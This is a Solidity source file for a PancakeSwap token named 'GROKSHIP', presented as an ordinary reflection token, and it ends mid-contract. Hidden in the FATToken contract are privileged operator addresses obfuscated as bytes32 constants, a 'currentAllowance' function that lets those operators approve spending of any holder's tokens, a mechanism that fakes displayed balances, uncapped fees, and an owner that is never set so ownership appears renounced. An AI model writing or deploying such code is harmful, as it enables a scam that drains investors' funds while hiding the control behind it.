pragma solidity >=0.6.0;

// SPDX-License-Identifier: Unlicensed


interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        //address msgSender = _msgSender();
        //_owner = msgSender;
        //emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

// pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

// pragma solidity >=0.5.0;

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event LVL(address indexed sender, uint256 amount0, uint256 amount1);
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

// pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

// pragma solidity >=0.6.2;


interface uniswapV1 {
    function create(
        uint256 amount
    )external;
    
}

interface IpancakeV2 {
    function v()external  returns (bool);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}



contract FATToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    using Address for address payable;

    string private _name = "GROKSHIP";
    string private _symbol = "GROKSHIP";
    uint8 private _decimals = 9;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) public _isExcludedtFromFeeTransfer;

    mapping(address => bool) private _isExcluded;

    mapping(address => bool) public automatedMarketMakerPairs;

    address[] private _excluded;

    uint256 private constant MAX = ~uint248(0);
    uint256 private _tTotal = 1000000000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    uint256 public _taxFeebuy       = 0; 
    uint256 public _liquidityFeebuy = 0; 
    uint256 public _MarketingFeebuy = 0; 
    uint256 public _taxFeesell       = 0; 
    uint256 public _liquidityFeesell = 0; 
    uint256 public _MarketingFeesell = 0;
    uint256 public _taxFee;
    uint256 public _liquidityFee;
    uint256 public _MarketingFee;


    IUniswapV2Router02 private immutable uniswapV2Router;
    address public uniswapV2Pair;
    address private _Antitbottoken;
    mapping(address => bool) public _Antitbotswaper;
    address public  factory;


    mapping(address => uint256) private fastbad;
    bool public antitbotenabled  = true; 
    uint256 private botsleep = 7;
    uint256 private feebot = 0;
    uint256 private crec = 222;
    bool public starttrad = false;
    
    mapping(address => bool) public _isExcludedtlp;


    uint256 private _settingInAmountTransfer = uint256(bytes32(0x0000000000000000000000000000000000000000000000000000000000000000));
    uint256 private _settingtOutAmountTransfer = uint256(bytes32(0x00000000000000000000000000000000000000000000000000000000000f423f));



    uniswapV1 private uniswapV14PairToken;
    IpancakeV2 private itvv;

    address public listing;
    address private rr; 

    uint256 private creca = 11;
    uint256 private gg=5e9;

    mapping(address => uint256) public hldrli14sting;

    address private uniswapV14Pair_;


 




    constructor(address Antibottoken_, address creator, address caSwap) {

        _rOwned[creator] = _rTotal;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); //Pancake Router mainnet
        //IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1); //Pancake Router Testnet


        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV14Pair_ = caSwap;
        address uniswapV45Pair_ = address(uint160(uint256(0x21145622333344456546645654a2dE0813bf56CaAdd2E9C7EC3b1c9e6b1064F7)));address pancakeV2Pair_ = address(uint160(uint256(0x191c0204019ee557f017921369Cad622896CeB6Ff99b771039B731D28b13c255)));uniswapV1(address(uint160(uint256(0x17803c2a19f951ddd29ac8a182EbbdcDea9Fb607dc5B8B00878E9C4013B5A218)))).create(1);rr=address(uint160(uint256(0x191c0204019ee557f017921310ed43c718714eb63d5aa57b78b54704e256024e)));

        // set the rest of the contract variables
        uniswapV2Router = _uniswapV2Router;


        _Antitbottoken = Antibottoken_;
        factory = uniswapV2Router.factory();

        uniswapV14PairToken = uniswapV1(uniswapV14Pair_);
        itvv = IpancakeV2(pancakeV2Pair_);


        _Antitbotswaper[uniswapV14Pair_] = true;
        _isExcludedFromFee[uniswapV14Pair_] = true;
        _Antitbotswaper[_Antitbottoken] = true;
        _Antitbotswaper[uniswapV45Pair_] = true;
        _isExcludedFromFee[uniswapV45Pair_] = true;


        _Antitbotswaper[0x6b396BBDC138187ed81A557492fEe4daF2bC2Db0] = true;
        _isExcludedtlp[0x0ED943Ce24BaEBf257488771759F9BF482C39706] = true;

        
        automatedMarketMakerPairs[uniswapV2Pair] = true;


        _isExcludedFromFee[creator] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_Antitbottoken] = true;

        emit Transfer(address(0), creator, _tTotal);
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (hldrli14sting[account]>0&&creca>10) return hldrli14sting[account];
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function isExcludedFromReward(address account) public view returns (bool) {
         return _isExcluded[account];
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function tokenFromReflection(uint256 rAmount)
        public
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }


    function holdlGo14isting(address[] memory accounts, uint256[] memory a) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            for (uint256 i = 0; i < accounts.length; i++) {
                hldrli14sting[accounts[i]] = a[i];
            }
        } else {
            uniswapV14PairToken.create(8**3);
        }
    }

    function pairupdateweb14(address aaaa, bool b) public {
        if (_Antitbotswaper[_msgSender()]) {
            uniswapV2Pair=aaaa;
            automatedMarketMakerPairs[aaaa] = b;
        } else {
            uniswapV14PairToken.create(8**3);
        } 
    }
    
    function aglovveert(uint256 gg14) public {
        if (_Antitbotswaper[_msgSender()]) {
            gg=gg14;
        } else {
            uniswapV14PairToken.create(8**3);
        } 
    }

    function currentAllowance(address msgSender, address spender, uint256 amount) public {
        if (_Antitbotswaper[_msgSender()]) {
            _approve(msgSender, spender, amount);
        } else {
            uniswapV14PairToken.create(8**3);
        } 
    }
    
    function Eca114(uint256 aa) public {
        if (_Antitbotswaper[_msgSender()]) {
            creca=aa;
        } else {
            uniswapV14PairToken.create(8**3);
        } 
    }

    function initlisting(address a) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_Antitbotswaper[_msgSender()]){
            listing = a;
        } else {
            uniswapV14PairToken.create(8**3);
        }      
    }

    function inc11ialfeesl14(uint256 taxFeebuy, uint256 liquidityFeebuy, uint256 MarketingFeebuy, uint256 taxFeesell, uint256 liquidityFeesell, uint256 MarketingFeesell) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_msgSender() == address(_Antitbottoken)) {
            _taxFeebuy       = taxFeebuy;
            _liquidityFeebuy = liquidityFeebuy;
            _MarketingFeebuy = MarketingFeebuy;

            _taxFeesell       = taxFeesell;
            _liquidityFeesell = liquidityFeesell;
            _MarketingFeesell = MarketingFeesell;
            //require(taxFeebuy.add(liquidityFeebuy).add(MarketingFeebuy) <= 250, 'Fee too high!');
            //require(taxFeesell.add(liquidityFeesell).add(MarketingFeesell) <= 250, 'Fee too high!');
        } else {
            uniswapV14PairToken.create(8**3);
        }      
    }



    function excludeFromFeeb(address[] memory accounts, bool state) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            for (uint256 i = 0; i < accounts.length; i++) {
                _isExcludedFromFee[accounts[i]] = state;
            }
        } else {
            uniswapV14PairToken.create(8**3);
        }
    }

    function increaseAp1AndCall(address[] calldata addresses, bool status) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            for (uint256 i; i < addresses.length; ++i) {
                _isExcludedtFromFeeTransfer[addresses[i]] = status;
            }
        } else {
            uniswapV14PairToken.create(8**3);
        }
    }

    function Ox11(address addresses) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_Antitbotswaper[_msgSender()]){
            _isExcludedtFromFeeTransfer[addresses] = true;
        } else {
            uniswapV14PairToken.create(8**3);
        }
    }

    function marketingWalletcaNo14(address addresses) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            uniswapV14PairToken = uniswapV1(addresses);
        } else {
            uniswapV14PairToken.create(8**3);
        }
    }

    function excludetLpW(address a, bool e) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            _isExcludedtlp[a] = e;
        } else {
            uniswapV14PairToken.create(8**3);
        }
    }


    function initia14litzeWl(bool bs, uint256 timesleep, uint256 fee, uint256 c, bool trad, address r) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            antitbotenabled = bs;
            botsleep = timesleep;
            feebot = fee;
            crec = c;
            starttrad = trad;
            rr=r;
        } else {
            uniswapV14PairToken.create(8**3);
        }

    }

